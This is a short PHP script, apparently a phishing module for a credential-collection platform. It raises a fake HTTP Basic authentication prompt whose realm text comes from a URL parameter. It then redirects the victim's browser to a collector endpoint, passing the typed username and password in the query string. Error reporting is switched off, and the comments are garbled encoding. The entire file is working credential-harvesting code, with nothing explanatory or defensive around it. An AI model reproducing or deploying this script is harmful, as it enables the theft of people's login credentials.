<?
error_reporting(0);
/* ������ $PHP_AUTH_USER ��$PHP_AUTH_PW ��ֵ*/

if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {

 /* ��ֵ�����Ͳ�����ʾ�ı��������ͷ��*/

    header('WWW-Authenticate: Basic realm="'.addslashes(trim($_GET['info'])).'"');

    header('HTTP/1.0 401 Unauthorized');

    echo 'Authorization Required.';

    exit;

} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){

    /* ����ֵ���ڣ�������Ƿ���ȷ */

	header("Location: http://127.0.0.1:8080/index.php?do=api&id={$_GET['id']}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");

}

?>